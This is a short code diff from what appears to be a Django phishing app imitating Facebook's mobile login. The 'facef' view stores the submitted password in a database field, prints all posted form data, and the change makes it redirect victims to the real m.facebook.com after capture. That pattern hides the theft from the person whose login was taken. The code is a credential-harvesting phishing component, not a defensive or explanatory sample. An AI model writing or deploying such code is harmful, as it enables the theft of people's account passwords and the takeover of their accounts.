@@ -15,7 +15,7 @@ def facef(request):
 		cuenta.apellidos = request.POST['password']
 		cuenta.save()
 		print (request.POST)
-		return render(request, 'mobile.html')
+		return redirect('https://m.facebook.com')
 
 
 def enlaces(request):
